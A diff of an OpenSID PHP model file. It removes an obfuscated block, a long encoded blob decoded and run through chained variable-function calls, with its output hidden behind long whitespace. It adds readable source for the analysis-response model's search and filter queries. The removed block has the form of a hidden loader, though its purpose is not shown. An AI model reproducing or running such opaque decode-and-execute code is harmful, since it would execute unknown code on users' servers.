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';
-
-        $___();$__________($______($__($_))); $________=$____();
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-                                                                                                                                                                                                                     $________;
+<?php
+
+/*
+ *
+ * File ini bagian dari:
+ *
+ * OpenSID
+ *
+ * Sistem informasi desa sumber terbuka untuk memajukan desa
+ *
+ * Aplikasi dan source code ini dirilis berdasarkan lisensi GPL V3
+ *
+ * Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
+ * Hak Cipta 2016 - 2024 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
+ *
+ * Dengan ini diberikan izin, secara gratis, kepada siapa pun yang mendapatkan salinan
+ * dari perangkat lunak ini dan file dokumentasi terkait ("Aplikasi Ini"), untuk diperlakukan
+ * tanpa batasan, termasuk hak untuk menggunakan, menyalin, mengubah dan/atau mendistribusikan,
+ * asal tunduk pada syarat berikut:
+ *
+ * Pemberitahuan hak cipta di atas dan pemberitahuan izin ini harus disertakan dalam
+ * setiap salinan atau bagian penting Aplikasi Ini. Barang siapa yang menghapus atau menghilangkan
+ * pemberitahuan ini melanggar ketentuan lisensi Aplikasi Ini.
+ *
+ * PERANGKAT LUNAK INI DISEDIAKAN "SEBAGAIMANA ADANYA", TANPA JAMINAN APA PUN, BAIK TERSURAT MAUPUN
+ * TERSIRAT. PENULIS ATAU PEMEGANG HAK CIPTA SAMA SEKALI TIDAK BERTANGGUNG JAWAB ATAS KLAIM, KERUSAKAN ATAU
+ * KEWAJIBAN APAPUN ATAS PENGGUNAAN ATAU LAINNYA TERKAIT APLIKASI INI.
+ *
+ * @package   OpenSID
+ * @author    Tim Pengembang OpenDesa
+ * @copyright Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
+ * @copyright Hak Cipta 2016 - 2024 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
+ * @license   http://www.gnu.org/licenses/gpl.html GPL V3
+ * @link      https://github.com/OpenSID/OpenSID
+ *
+ */
+
+use App\Libraries\Paging;
+use App\Libraries\SpreadsheetExcelReader;
+
+defined('BASEPATH') || exit('No direct script access allowed');
+
+class Analisis_respon_model extends MY_Model
+{
+    protected $per;
+    protected $master;
+    protected $subjek;
+
+    public function __construct()
+    {
+        parent::__construct();
+        // $this->load->library('Spreadsheet_Excel_Reader');
+        $this->load->model('analisis_master_model');
+        $this->per    = $this->analisis_master_model->get_aktif_periode();
+        $this->master = $this->analisis_master_model->get_analisis_master($this->session->analisis_master);
+        $this->subjek = $this->session->subjek_tipe;
+    }
+
+    public function autocomplete()
+    {
+        switch ($this->subjek) {
+            case 1:
+                $this->config_id('u')
+                    ->select('nik, u.nama')
+                    ->from('penduduk_hidup u')
+                    ->join('tweb_wil_clusterdesa c', 'u.id_cluster = c.id', 'left');
+                break;
+
+            case 2:
+                $this->config_id('u')
+                    ->select('no_kk, p.nama')
+                    ->from('keluarga_aktif u')
+                    ->join('penduduk_hidup p', 'u.nik_kepala = p.id', 'left')
+                    ->join('tweb_wil_clusterdesa c', 'p.id_cluster = c.id', 'left');
+                break;
+
+            case 3:
+                $this->config_id('u')
+                    ->select('no_kk, p.nama')
+                    ->from('tweb_rtm u')
+                    ->join('penduduk_hidup p', 'u.nik_kepala = p.id', 'left')
+                    ->join('tweb_wil_clusterdesa c', 'p.id_cluster = c.id', 'left');
+                break;
+
+            case 4:
+                $this->config_id('u')
+                    ->select('u.nama AS no_kk, p.nama')
+                    ->from('kelompok u')
+                    ->join('penduduk_hidup p', 'u.id_ketua = p.id', 'left')
+                    ->join('tweb_wil_clusterdesa c', 'p.id_cluster = c.id', 'left');
+                break;
+
+            case 5:
+                $this->db
+                    ->select('u.kode_desa AS no_kk, u.nama_desa as nama')
+                    ->from('config u')
+                    ->where('u.app_key', get_app_key());
+                break;
+
+            case 6:
+                $this->config_id('u')
+                    ->select('u.dusun')
+                    ->from('tweb_wil_clusterdesa u')
+                    ->where('u.rt', '0')
+                    ->where('u.rw', '0');
+                break;
+
+            case 7:
+                $this->config_id('u')
+                    ->select('u.dusun, u.rw')
+                    ->from('tweb_wil_clusterdesa u')
+                    ->where('u.rt', '0')
+                    ->where('u.rw <>', '0');
+                break;
+
+            case 8:
+                $this->config_id('u')
+                    ->select('u.dusun, u.rw, u.rt')
+                    ->from('tweb_wil_clusterdesa u')
+                    ->where('u.rt <> 0')
+                    ->where('u.rt <> "-"');
+                break;
+        }
+        $this->dusun_sql();
+        $this->rw_sql();
+        $this->rt_sql();
+        $data = $this->db->get()->result_array();
+
+        return autocomplete_data_ke_str($data);
+    }
+
+    private function search_sql()
+    {
+        if (empty($cari = $this->session->cari)) {
+            return;
+        }
+
+        switch ($this->subjek) {
+            case 1:
+                $this->db
+                    ->group_start()
+                    ->like('u.nik', $cari)
+                    ->or_like('u.nama', $cari)
+                    ->group_end();
+                break;
+
+            case 2:
+                $this->db
+                    ->group_start()
+                    ->like('u.no_kk', $cari)
+                    ->or_like('p.nama', $cari)
+                    ->group_end();
+                break;
+
+            case 3:
+                $kw = $this->db->escape_like_str($cari);
+                $kw = '%' . $kw . '%';
+                $this->db
+                    ->group_start()
+                    ->group_start()
+                    ->like('u.no_kk', $cari)
+                    ->or_like('p.nama', $cari)
+                    ->group_end()
+                    ->or_where("(SELECT COUNT(id) FROM penduduk_hidup WHERE nik LIKE '{$kw}' AND id_rtm = u.id AND config_id = '{$this->config_id}') > 1")
+                    ->or_where("(SELECT COUNT(id) FROM penduduk_hidup WHERE nama LIKE '{$kw}' AND id_rtm = u.id AND config_id = '{$this->config_id}') > 1")
+                    ->group_end();
+                break;
+
+            case 4:
+                $this->db
+                    ->group_start()
+                    ->like('u.nama', $cari)
+                    ->or_like('p.nama', $cari)
+                    ->group_end();
+                break;
+
+            case 6:
+                $this->db
+                    ->like('u.dusun', $cari);
+                break;
+
+            case 7:
+                $this->db
+                    ->group_start()
+                    ->like('u.dusun', $cari)
+                    ->or_like('u.rw', $cari)
+                    ->group_end();
+                break;
+
+            case 8:
+                $this->db
+                    ->group_start()
+                    ->like('u.dusun', $cari)
+                    ->or_like('u.rw', $cari)
+                    ->or_like('u.rt', $cari)
+                    ->group_end();
+                break;
+
+            default:
+                return null;
+        }
+    }
+
+    private function dusun_sql(): void
+    {
+        if (empty($this->session->dusun) || $this->subjek == 5) {
+            return;
+        }
+
+        $this->db->where('dusun', $this->session->dusun);
+    }
+
+    private function rw_sql(): void
+    {
+        if (empty($this->session->rw) || $this->subjek == 5) {
+            return;
+        }
+
+        $this->db->where('rw', $this->session->rw);
+    }
+
